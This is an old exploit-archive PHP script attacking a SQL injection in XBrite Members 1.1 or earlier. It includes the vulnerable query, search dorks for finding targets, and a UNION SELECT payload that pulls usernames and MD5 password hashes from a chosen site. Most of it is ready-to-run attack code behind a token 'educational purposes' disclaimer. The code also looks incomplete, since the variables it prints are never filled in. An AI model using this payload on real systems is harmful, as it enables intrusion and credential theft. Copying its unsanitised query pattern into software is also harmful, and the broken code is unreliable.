XBrite Members <= 1.1 (id) Remote SQL Injection Exploit
=======================================================





<?php /*
 |=================================================================================================|
 |       _______..__   __.      ___      .___________.  ______  __    __   _______ .______         |
 |      /       ||  \ |  |     /   \     |           | /      ||  |  |  | |   ____||   _  \        |
 |     |   (----`|   \|  |    /  ^  \    `---|  |----`|  ,----&#039;|  |__|  | |  |__   |  |_)  |       |
 |      \   \    |  . `  |   /  /_\  \       |  |     |  |     |   __   | |   __|  |      /        |
 |  .----)   |   |  |\   |  /  _____  \      |  |     |  `----.|  |  |  | |  |____ |  |\  \----.   |
 |  |_______/    |__| \__| /__/     \__\     |__|      \______||__|  |__| |_______|| _| `._____|   |
 |                                                                                                 |
 |=================================================================================================|


      exploit: XBrite Members <= 1.1 remote sql injection vulnerability
      release: 2006-04-09
       author: snatcher [snatcher at gmx.ch]
      country: switzerland  |+|
	  
  application: XBrite Members <= 1.1
  description: a php / mysql based member script

  description: if magic_quotes_gpc is Off, you can get each password (md5 hash) with a simple sql injection
  fingerprint: google -> "Powered By XBrite Members" -> 2800
               msn -> "Powered By XBrite Members" ->  581
   conditions: php.ini -> magic_quotes_gpc = Off
       greets: all security guys and coders over the world, honkey :>, ..
 terms of use: this exploit is just for educational purposes, do not use it for illegal acts.


---------------------------- members.php - line 197 -------------------------------------
$query = @mysql_query ("select * from oz_members where id=&#039;".$_GET[&#039;id&#039;]."&#039;");
-----------------------------------------------------------------------------------------

because magic_quotes_gpc is off, you can break out of the singel quotes and insert malicious sql code,
i.e. with a union operator.


*/

/*********************** CONFIGURATION ****************************/

$PATH_TO_FILE  = &#039;http://yourhost.com/member.php&#039;;                 // in example: http://yourhost.com/member.php
$USER_ID       = 1;                                                // from which user id do you want the password? default: 1
$GET_VARS      = &#039;?action=members&act=show&id=&#039;;                   // do not change
$SQL_INJECTION = &#039;0\&#039; union select 1,1,1,1,1,1,1,1,1,real_name&#039;.   // do not change
                 &#039;,name,pw,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,&#039;.
				 &#039;1,1,1,1,1,1,1,1,1,1,1,1 from oz_members where &#039;.
				 &#039;id = &#039;.$USER_ID.&#039; /*&#039;;


/**************************** MAIN ********************************/

$file_array = file($PATH_TO_FILE.$GET_VARS.urlencode($SQL_INJECTION))or die(&#039;couldn\&#039;t open host!&#039;); 
foreach ($file_array as $now)                               
	$html_content .= $now;

$html_content = str_castrate($html_content);


if ($username[1][0] && $password[1][0] && $username[1][0] <> &#039;keineAngabe&#039;) {
	echo &#039;username: <b>&#039;.$username[1][0].&#039;</b><br>&#039;;
	echo &#039;password: <b>&#039;.$password[1][0].&#039;</b>&#039;;
}else {
	echo &#039;exploit failed! <br>magic_quotes_gpc = Off ?&#039;;
}
echo &#039;<br><br><br><br><br>
======================================================================<br>
exploit: XBrite Members <= 1.1 remote sql injection vulnerability<br>
release: 2006-04-09<br>
author: snatcher [snatcher at gmx.ch]<br>
======================================================================&#039;;

function str_castrate($string) {
	$string = str_replace("\n", &#039;&#039;, $string);
	$string = str_replace("\r", &#039;&#039;, $string);
	$string = str_replace(" ", &#039;&#039;, $string);
	return $string;
}
?>



